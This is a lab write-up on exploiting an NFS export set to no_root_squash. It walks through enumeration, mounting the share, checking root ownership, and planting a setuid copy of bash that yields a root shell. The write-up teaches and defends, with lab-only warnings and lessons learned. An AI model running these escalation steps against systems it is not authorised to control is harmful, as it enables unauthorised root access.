# NFS Misconfiguration: no_root_squash Privilege Escalation

## Overview
This write-up demonstrates how a misconfigured NFS export using `no_root_squash` can lead to full root compromise. The exercise was performed in a controlled lab environment to understand enumeration, trust boundaries, and privilege escalation mechanics.

> [!NOTE]
> This procedure is for isolated lab validation only. Do not run against systems you do not own or explicitly control.

## Key Concepts
- **NFS (Network File System)** allows directories to be shared over a network
- **root_squash** maps remote root to an unprivileged user (safe default)
- **no_root_squash** preserves root privileges across NFS (dangerous)
- Enumeration reveals exposure before exploitation

> [!WARNING]
> Exports with `no_root_squash` effectively grant remote root on the share and should be treated as high-risk.

---

## Enumeration

### Enumerate as a client
```bash
showmount -e localhost
```

Example output:
```text
/srv/nfs_share *
```

This indicates the NFS share is accessible by any host.

---

## Mounting the Share
```bash
mkdir /tmp/nfs_enum
sudo mount -t nfs localhost:/srv/nfs_share /tmp/nfs_enum
ls -la /tmp/nfs_enum
```

---

## Validating the Vulnerability
```bash
touch /tmp/nfs_enum/test_user
sudo touch /tmp/nfs_enum/test_root
ls -l /tmp/nfs_enum
```

Observed results:
- User-created file owned by the normal user
- Root-created file owned by root

This confirms that `no_root_squash` is active.

---

## Privilege Escalation
```bash
sudo cp /bin/bash /tmp/nfs_enum/rootbash
sudo chmod +s /tmp/nfs_enum/rootbash
ls -l /tmp/nfs_enum/rootbash
```

Expected permissions:
```text
-rwsr-xr-x 1 root root ...
```

Execute from the server context:
```bash
sudo umount /tmp/nfs_enum
/srv/nfs_share/rootbash -p
```

---

## Lessons Learned
- Enumeration always precedes exploitation
- Misconfigurations can be more dangerous than missing patches
- `no_root_squash` should almost never be used
- Fixes must be verified from the attacker's perspective


